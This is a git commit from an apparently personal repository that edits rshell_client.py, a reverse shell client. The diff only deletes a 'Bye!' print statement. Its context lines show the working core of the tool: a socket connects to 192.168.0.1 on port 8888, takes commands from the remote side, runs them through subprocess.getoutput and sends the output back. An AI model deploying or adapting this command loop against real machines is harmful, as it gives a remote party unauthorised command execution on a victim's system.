0b714af223a6ef3dd0ad6ed71d35759167eb7826
Ainur <47248272+xtronix2000@users.noreply.github.com>
2023-10-05 23:35:07 +0300

    Update rshell_client.py

--- rshell_client.py
+++ rshell_client.py
@@ -5,7 +5,6 @@ s.connect(('192.168.0.1', 8888))
 while True:
   command = s.recv(1024).decode()
   if command.lower() == 'exit':
-    print('Bye!')
     break
   output = subprocess.getoutput(command)
   s.send(output.encode())
